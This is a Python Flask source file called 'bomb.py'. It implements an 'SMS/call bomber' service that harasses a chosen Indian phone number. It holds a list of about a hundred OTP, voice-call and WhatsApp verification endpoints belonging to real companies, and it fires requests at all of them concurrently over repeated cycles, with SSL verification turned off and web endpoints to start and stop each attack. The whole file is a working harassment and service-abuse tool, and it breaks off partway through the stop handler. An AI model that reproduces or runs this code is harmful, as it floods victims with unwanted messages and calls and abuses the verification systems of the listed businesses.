# bomb.py - Fixed for Python 3.14

from flask import Flask, request, jsonify
import requests
import json
import time
import threading
import re
from concurrent.futures import ThreadPoolExecutor
import urllib3
from datetime import datetime
import os
import sys

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================================================================
# FIX FOR PYTHON 3.14 - Override Flask's find_package
# ======================================================================

import importlib
import pkgutil

# Fix for Python 3.14 - pkgutil.get_loader is deprecated
if not hasattr(pkgutil, 'get_loader'):
    def get_loader(module_name):
        try:
            return importlib.util.find_spec(module_name)
        except:
            return None
    pkgutil.get_loader = get_loader

app = Flask(__name__)

# ======================================================================
# WORKING APIS - All 100+ OTP Sending APIs
# ======================================================================

WORKING_APIS = [
    {
        "name": "Tata_Capital_Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
    },
    {
        "name": "Paytm_Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Goibibo_Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Myntra_Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Amazon_Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "params": {},
        "data": lambda phone: f"phone={phone}&action=voice_otp",
    },
    {
        "name": "MakeMyTrip_Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Myntra_SMS",
        "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Jockey_WhatsApp",
        "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "Accept": "*/*",
            "Referer": "https://www.jockey.in/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        },
        "params": {},
        "data": None,
    },
    {
        "name": "Swiggy_Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Amazon_SMS",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "params": {},
        "data": lambda phone: f"phone={phone}&action=otp",
    },
    {
        "name": "Foxy_WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "Referer": "https://www.foxy.in/onboarding",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        },
        "params": {},
        "data": lambda phone: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{phone}"}}}}',
    },
    {
        "name": "Eka_Care",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "Client-Id": "androidp",
            "User-Agent": "okhttp/4.9.3",
            "Accept-Encoding": "gzip, deflate",
        },
        "params": {},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}',
    },
    {
        "name": "KPN_Fresh_AND",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11",
        },
        "params": {},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
    },
    {
        "name": "Rappi_WhatsApp2",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1",
            "Accept-Encoding": "gzip",
        },
        "params": {},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
    },
    {
        "name": "Croma_SMS",
        "url": "https://www.croma.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Ajio_SMS",
        "url": "https://www.ajio.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
    },
    {
        "name": "FirstCry_SMS",
        "url": "https://www.firstcry.com/api/sendotp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Nykaa_SMS",
        "url": "https://www.nykaa.com/api/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Mamaearth_SMS",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Bewakoof_SMS",
        "url": "https://www.bewakoof.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Swiggy_SMS",
        "url": "https://www.swiggy.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Meesho_SMS",
        "url": "https://meesho.com/api/v1/auth/otpsend",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "BigBasket_SMS",
        "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile_number":"{phone}"}}',
    },
    {
        "name": "BigBasket_Call",
        "url": "https://www.bigbasket.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Souled_Store",
        "url": "https://www.thesouledstore.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "BurgerKing_SMS",
        "url": "https://www.burgerking.in/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Grofers_SMS",
        "url": "https://www.grofers.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Meesho_WhatsApp",
        "url": "https://meesho.com/gw/login-register/v1/sendOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"number":"{phone}","otpOnCall":true}}',
    },
    {
        "name": "Licious_SMS",
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "MakeMyTrip_SMS",
        "url": "https://www.makemytrip.com/api/umbrella/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Goibibo_SMS",
        "url": "https://www.goibibo.com/user/otp/generate/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Blinkit_SMS",
        "url": "https://blinkit.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "FreshToHome",
        "url": "https://www.freshtohome.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "CountryDelight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android"}}',
    },
    {
        "name": "IRCTC_SMS",
        "url": "https://www.irctc.co.in/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "RedBus_SMS",
        "url": "https://www.redbus.in/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "IRCTC_Call",
        "url": "https://www.irctc.co.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "OYO_Call",
        "url": "https://www.oyorooms.com/api/pwa/generateotp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}',
    },
    {
        "name": "Ixigo_SMS",
        "url": "https://www.ixigo.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "EaseMyTrip_SMS",
        "url": "https://www.easemytrip.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Rapido_SMS",
        "url": "https://rapido.bike/api/v2/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Rapido_Call",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "PharmEasy_SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Curefit_SMS",
        "url": "https://www.cure.fit/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Yatra_SMS",
        "url": "https://www.yatra.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Unacademy_SMS",
        "url": "https://unacademy.com/api/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Practo_SMS",
        "url": "https://www.practo.com/patient/loginviapassword",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Vedantu_SMS",
        "url": "https://www.vedantu.com/api/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Gaana_SMS",
        "url": "https://www.gaana.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Paytm_SMS",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}}',
    },
    {
        "name": "GooglePay_SMS",
        "url": "https://pay.google.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}',
    },
    {
        "name": "Groww_SMS",
        "url": "https://groww.in/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Zerodha_SMS",
        "url": "https://zerodha.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "PhonePe_SMS",
        "url": "https://www.phonepe.com/api/v2/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "JioCinema_SMS",
        "url": "https://www.jiocinema.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Naukri_SMS",
        "url": "https://www.naukri.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "AngelOne_SMS",
        "url": "https://www.angelone.in/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Indeed_SMS",
        "url": "https://www.indeed.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Freelancer_SMS",
        "url": "https://www.freelancer.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Magicbricks_SMS",
        "url": "https://www.magicbricks.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "LinkedIn_SMS",
        "url": "https://www.linkedin.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Upwork_SMS",
        "url": "https://www.upwork.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Upstox_SMS",
        "url": "https://upstox.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Fiverr_SMS",
        "url": "https://www.fiverr.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "ZEE5_SMS",
        "url": "https://www.zee5.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Housing_SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
    },
    {
        "name": "MPL_SMS",
        "url": "https://www.mpl.live/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "params": {},
        "data": lambda phone: f"phone={phone}&countryCode=IN",
    },
    {
        "name": "GooglePay_Call",
        "url": "https://pay.google.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        },
        "params": {},
        "data": lambda phone: f"mobile_number={phone}",
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
        },
        "params": {},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"channel":"OTP","mobile":"{phone}","selectedCountryCode":"+91"}}',
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}',
    },
    {
        "name": "Jockey_SMS",
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {
            "Accept": "*/*",
            "Referer": "https://www.jockey.in/",
        },
        "params": {},
        "data": None,
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}',
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"query":"mutation {{ SendOtp(input: {{mobile: \\\"{phone}\\\", isdCode: \\\"91\\\", otpType: \\\"registerOtp\\\" }}) {{ status {{ message }} }} }}"}}',
    },
    {
        "name": "NewMe_Asia",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}',
    },
    {
        "name": "Tata_Capital_Additional",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}',
    },
    {
        "name": "Dealshare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}',
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
    },
    {
        "name": "Voot_SMS",
        "url": "https://www.voot.com/api/v1/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
    },
    {
        "name": "Univest",
        "url": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {
            "User-Agent": "okhttp/3.9.1",
        },
        "params": {},
        "data": None,
    },
    {
        "name": "Xylem",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Agrevolution",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}',
    },
    {
        "name": "BigCash",
        "url": "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {
            "Referer": "https://www.bigcash.live/games/poker",
        },
        "params": {},
        "data": None,
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}',
    },
    {
        "name": "A23_Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}',
    },
    {
        "name": "Pratech",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "WorkIndia",
        "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "params": {},
        "data": None,
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}',
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}',
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}',
    },
    {
        "name": "Wellness_Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "params": {},
        "data": lambda phone: f'method=firstRegisterApi&data={{"customerMobile":"{phone}","generateOtp":"true"}}',
    },
    {
        "name": "Astrosage",
        "url": "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "params": {},
        "data": None,
    },
    {
        "name": "Codfirm",
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "params": {},
        "data": None,
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
        },
        "params": {},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}',
    },
]



# ======================================================================
# ACTIVE SESSIONS
# ======================================================================

active_sessions = {}
session_stats = {}

# ======================================================================
# SEND BOMB FUNCTION
# ======================================================================

def send_bomb(api, phone):
    """Send a single bomb request"""
    try:
        name = api.get("name", "Unknown")
        url = api.get("url", "")
        method = api.get("method", "GET").upper()
        headers = api.get("headers", {}).copy()
        data = api.get("data")
        params = api.get("params", {})
        
        if "{phone}" in url:
            url = url.replace("{phone}", phone)
        
        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"
        
        if callable(data):
            data = data(phone)
        elif isinstance(data, str) and "{phone}" in data:
            data = data.replace("{phone}", phone)
        
        if isinstance(params, dict):
            params = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                     for k, v in params.items()}
        
        req_kwargs = {
            "url": url,
            "method": method,
            "headers": headers,
            "timeout": 10,
            "verify": False,
            "allow_redirects": True
        }
        
        if method == "GET":
            if params:
                req_kwargs["params"] = params
        else:
            if headers.get("Content-Type", "").startswith("application/json") and data:
                try:
                    req_kwargs["json"] = json.loads(data) if isinstance(data, str) else data
                except:
                    req_kwargs["data"] = data
            elif data:
                req_kwargs["data"] = data
        
        start = time.time()
        response = requests.request(**req_kwargs)
        elapsed = time.time() - start
        
        status = response.status_code
        
        success = False
        if 200 <= status < 400:
            success = True
        elif status in [400, 401, 403, 429]:
            try:
                text = response.text.lower()
                if any(w in text for w in ["otp", "sent", "success", "code", "message", "verified"]):
                    success = True
            except:
                pass
        
        return {"name": name, "status": status, "success": success}
        
    except Exception as e:
        return {"name": api.get("name", "Unknown"), "status": None, "success": False}

# ======================================================================
# BOMB THREAD FUNCTION
# ======================================================================

def bomb_thread(phone, cycles=3):
    """Run bombing in background"""
    if phone in active_sessions:
        return
    
    active_sessions[phone] = True
    session_stats[phone] = {"total": 0, "success": 0, "failed": 0, "running": True}
    
    try:
        for cycle in range(cycles):
            if not active_sessions.get(phone, False):
                break
                
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(send_bomb, api, phone): api for api in WORKING_APIS}
                
                for future in as_completed(futures):
                    if not active_sessions.get(phone, False):
                        break
                    result = future.result()
                    session_stats[phone]["total"] += 1
                    if result["success"]:
                        session_stats[phone]["success"] += 1
                    else:
                        session_stats[phone]["failed"] += 1
                    time.sleep(0.05)
            
            if not active_sessions.get(phone, False):
                break
            time.sleep(2)
    
    finally:
        if phone in active_sessions:
            del active_sessions[phone]
        if phone in session_stats:
            session_stats[phone]["running"] = False

# ======================================================================
# API ENDPOINTS
# ======================================================================

@app.route('/', methods=['GET'])
def home():
    """Home endpoint"""
    return jsonify({
        "status": "online",
        "service": "Brutal Bomber API",
        "endpoints": {
            "/bomb/{phone}": "Start bombing",
            "/stop/{phone}": "Stop bombing",
            "/status/{phone}": "Check status",
            "/stats": "Global stats",
            "/apis": "List all APIs"
        },
        "total_apis": len(WORKING_APIS)
    })

@app.route('/bomb/<phone>', methods=['GET'])
def bomb(phone):
    """Start bombing a phone number"""
    if not phone or not phone.isdigit() or len(phone) != 10:
        return jsonify({"error": "Invalid phone number! Must be 10 digits"}), 400
    
    if phone in active_sessions:
        return jsonify({
            "status": "already_running",
            "message": f"Bombing already active for {phone}",
            "stats": session_stats.get(phone, {})
        })
    
    # Start bombing in background thread
    thread = threading.Thread(target=bomb_thread, args=(phone, 3))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "status": "started",
        "message": f"Bombing started for {phone}",
        "total_apis": len(WORKING_APIS),
        "stop_endpoint": f"/stop/{phone}"
    })

@app.route('/stop/<phone>', methods=['GET'])
def stop(phone):
